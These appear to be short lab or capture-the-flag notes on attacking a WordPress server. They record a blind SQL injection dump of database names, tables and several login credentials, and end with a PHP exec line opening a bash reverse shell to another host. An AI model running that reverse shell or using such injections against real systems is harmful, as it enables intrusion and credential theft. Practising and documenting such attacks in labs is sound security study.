# UOPEASY

Apache/2.4.7 (Ubuntu) Server at 10.10.113.36 Port 80
Wordpress 4.7.9.1
X-Powered-By: PHP/5.4.35

# Blind SQLi

- database = login
- table = users
- columns =
    - user_name
    - password
- dump
    - candyshop:password
    - Sir:PopRocks

- database = wordpress8080
- table = users
- columns =
    - username
    - password
- dump
    - admin
    - SuperSecretPassword

# Reverse shell
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.1.148/9090 0>&1'");